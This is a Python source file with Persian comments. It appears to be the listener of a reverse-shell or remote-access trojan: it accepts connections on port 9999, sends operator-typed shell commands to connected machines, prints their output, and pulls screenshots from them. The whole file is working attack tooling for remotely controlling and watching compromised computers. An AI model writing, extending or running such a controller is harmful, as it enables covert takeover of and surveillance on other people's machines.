import socket
import subprocess
import threading
import logging
import os

# تنظیمات لاگ‌گیری
logging.basicConfig(filename='server.log', level=logging.INFO, format='%(asctime)s - %(message)s')

def handle_client(client_socket, client_address):
    try:
        logging.info(f"Client {client_address} connected.")
        print(f"Client {client_address} connected.")

        while True:
            # دریافت دایرکتوری فعلی از کلاینت
            current_dir = client_socket.recv(4096).decode()
            if not current_dir:
                print(f"Client {client_address} disconnected.")
                logging.info(f"Client {client_address} disconnected.")
                break  # اگر کلاینت قطع شود

            # نمایش دایرکتوری فعلی و دریافت دستور
            command = input(f"{current_dir}> ").strip()

            # اگر دستور خالی بود
            if not command:
                print("Error: Please type a command.")
                client_socket.send("No command entered.".encode())
                continue

            # پشتیبانی از دستورات clear و cls
            if command.lower() in ["clear", "cls"]:
                os.system("cls" if os.name == "nt" else "clear")
                client_socket.send("Screen cleared.".encode())
                continue

            # ارسال دستور به کلاینت
            client_socket.send(command.encode())

            if command.lower() == 'exit':
                break

            # اگر دستور اسکرین‌شات بود
            if command.lower() == 'screenshot':
                # دریافت عکس از کلاینت
                screenshot_data = client_socket.recv(4096 * 1024)  # دریافت داده‌های عکس
                if screenshot_data:
                    with open("screenshot.png", "wb") as f:
                        f.write(screenshot_data)
                    print("Screenshot received and saved as 'screenshot.png'.")
                continue

            # دریافت پاسخ از کلاینت
            response = client_socket.recv(4096).decode()
            print(response)

    except Exception as e:
        logging.error(f"Error with client {client_address}: {e}")
    finally:
        client_socket.close()
        logging.info(f"Connection with {client_address} closed.")
        print(f"Connection with {client_address} closed. Waiting for new connections...")

def start_server(host='0.0.0.0', port=9999):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    logging.info(f"Server started on {host}:{port}")
    print(f"Server started on {host}:{port}")

    while True:
        client_socket, client_address = server_socket.accept()
        logging.info(f"New connection from {client_address}")
        print(f"New connection from {client_address}")

        # ایجاد یک thread جدید برای هر کلاینت
        client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
        client_thread.start()

if __name__ == "__main__":
    start_server()